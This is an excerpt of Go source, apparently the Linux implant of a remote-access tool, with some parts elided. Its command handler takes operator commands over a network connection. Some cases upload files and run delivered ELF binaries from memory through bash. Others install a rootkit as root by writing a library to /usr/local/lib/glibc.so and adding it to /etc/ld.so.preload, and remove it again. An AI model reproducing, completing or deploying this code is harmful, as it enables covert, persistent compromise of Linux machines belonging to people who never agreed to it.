...
func Log(log string, Connection net.Conn, unmsgpack MessagePack.MsgPack) {
...
func Read(Data []byte, Connection net.Conn) {
	...
	case "UploadFile":
		...
		if err != nil {
			Log("File writing failed! , please elevate privileges", Connection, *unmsgpack)
		}
	...
	case "UNZIP":
		{
			...
			if !strings.HasSuffix(filename, ".zip") {
				Log("FileName does not end with .zip", Connection, *unmsgpack)
				return
			}
	...
	case "memfd":
		go func() { //Async memfd Thread
			...
			stdout, stderr := HandleMemfd.MemfdShellA(elf, args, "/bin/bash")
			if stdout == "" {
				stdout = stderr
			}
			fmt.Println(stdout)
	...
	case "LoadLinuxRootKit":
		{
			uid := os.Getuid()
			//fmt.Printf("The UID is %d\n", uid)

			if uid == 0 {
				fullPath := "/usr/local/lib/glibc.so"
				//fullPath := filepath.Join(unmsgpack.ForcePathObject("UploaFilePath").GetAsString(), unmsgpack.ForcePathObject("Name").GetAsString())
				err := ioutil.WriteFile(fullPath, unmsgpack.ForcePathObject("File").GetAsBytes(), 0644)
				if err != nil {
					Log("File writing failed! , please elevate privileges", Connection, *unmsgpack)
				}

				cmd := exec.Command("bash", "-c", "echo /usr/local/lib/glibc.so >> /etc/ld.so.preload")
				...
				searchString := "/usr/local/lib/glibc.so"
				result := string(output)

				if checkStringInDirectoryFile(filePath, searchString) {
					Log("[+] RootKit loaded successfully!", Connection, *unmsgpack)
				} else {
					Log(result+"RootKit loaded failed", Connection, *unmsgpack)
				}
			} else {
				Log("[+] Insufficient permissions, please use root permissions!", Connection, *unmsgpack)
			}
		}
	case "UnloadLinuxRootkit":
		{
			uid := os.Getuid()
			//fmt.Printf("The UID is %d\n", uid)
			if uid == 0 {
				go func() {
					...
					err := deleteStringFromFile(filePath, searchString)
					if err != nil {
						Log("file does not exist", Connection, *unmsgpack)
					} else {
						if checkStringInDirectoryFile(filePath, searchString) {
							Log("[+] RootKit uninstall failed", Connection, *unmsgpack)
						} else {
							Log("[+] RootKit uninstalled successfully", Connection, *unmsgpack)
